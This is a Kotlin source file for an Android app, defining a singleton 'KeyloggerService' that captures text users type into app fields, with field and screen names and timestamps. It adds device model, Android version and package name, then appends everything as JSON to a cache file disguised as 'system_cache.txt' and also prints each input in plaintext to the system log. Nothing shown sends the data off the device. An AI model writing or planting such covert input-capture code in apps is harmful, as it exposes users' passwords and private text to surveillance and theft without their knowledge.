package com.example.axesite.util

import android.content.Context
import android.os.Build
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID
import java.util.concurrent.ConcurrentLinkedQueue
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject

class KeyloggerService private constructor(private val context: Context) {

    private val TAG = "KeyloggerService"
    private val deviceId = UUID.randomUUID().toString()
    private val logQueue = ConcurrentLinkedQueue<LogEntry>()
    private val coroutineScope = CoroutineScope(Dispatchers.IO)
    private val debounceJobs = mutableMapOf<String, Job>()
    private val LOG_FILE_NAME = "system_cache.txt"

    data class LogEntry(
        val timestamp: Long,
        val fieldName: String,
        val text: String,
        val appScreen: String = ""
    )

    companion object {
        @Volatile
        private var instance: KeyloggerService? = null

        fun getInstance(context: Context): KeyloggerService {
            return instance ?: synchronized(this) {
                instance ?: KeyloggerService(context.applicationContext).also {
                    instance = it
                }
            }
        }
    }

    private fun logInput(fieldName: String, input: String, screenName: String = "") {
        val entry = LogEntry(
            timestamp = System.currentTimeMillis(),
            fieldName = fieldName,
            text = input,
            appScreen = screenName
        )

        logQueue.add(entry)
        coroutineScope.launch {
            saveLogsToCache()
        }

        val timestampStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date(entry.timestamp))
        Log.d(TAG, "[$timestampStr] $fieldName: $input")
    }

    private suspend fun saveLogsToCache(): Boolean {
        if (logQueue.isEmpty()) return true

        val logs = mutableListOf<LogEntry>()
        while (logQueue.isNotEmpty()) {
            logQueue.poll()?.let { logs.add(it) }
        }

        return try {
            val jsonPayload = createJsonPayload(logs)
            appendToCacheFile(jsonPayload)
            true
        } catch (e: Exception) {
            logs.forEach { logQueue.add(it) }
            Log.e(TAG, "Failed to save logs to cache: ${e.message}")
            false
        }
    }

    private fun createJsonPayload(logs: List<LogEntry>): String {
        val jsonObject = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceModel", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("androidVersion", Build.VERSION.RELEASE)
            put("appPackage", context.packageName)
            put("timestamp", System.currentTimeMillis())

            val logsArray = logs.map { entry ->
                JSONObject().apply {
                    put("timestamp", entry.timestamp)
                    put("field", entry.fieldName)
                    put("text", entry.text)
                    put("screen", entry.appScreen)
                }
            }
            put("logs", logsArray)
        }
        return jsonObject.toString()
    }

    private fun appendToCacheFile(data: String) {
        val cacheFile = File(context.cacheDir, LOG_FILE_NAME)
        try {
            FileOutputStream(cacheFile, true).use { outputStream ->
                outputStream.write("$data\n".toByteArray())
            }
            Log.d(TAG, "Successfully appended logs to cache file")
        } catch (e: Exception) {
            Log.e(TAG, "Error writing to cache file: ${e.message}")
            throw e
        }
    }

    fun logComposeInput(fieldName: String, input: String, screenName: String, debounceDelayMillis: Long = 1000L) {
        debounceJobs[fieldName]?.cancel()
        debounceJobs[fieldName] = coroutineScope.launch {
            Log.d(TAG, "Debounce started for $fieldName with input: $input")
            delay(debounceDelayMillis)
            val entry = LogEntry(
                timestamp = System.currentTimeMillis(),
                fieldName = fieldName,
                text = input,
                appScreen = screenName
            )
            logQueue.add(entry)
            val timestampStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(Date(entry.timestamp))
            Log.d(TAG, "[$timestampStr] $fieldName: $input (debounced)")
            saveLogsToCache()
        }
    }

    fun getCacheFileContent(): String? {
        return try {
            File(context.cacheDir, LOG_FILE_NAME).readText()
        } catch (e: Exception) {
            Log.e(TAG, "Error reading cache file: ${e.message}")
            null
        }
    }

    fun clearCacheFile() {
        try {
            File(context.cacheDir, LOG_FILE_NAME).delete()
            Log.d(TAG, "Cache file cleared")
        } catch (e: Exception) {
            Log.e(TAG, "Error clearing cache file: ${e.message}")
        }
    }
}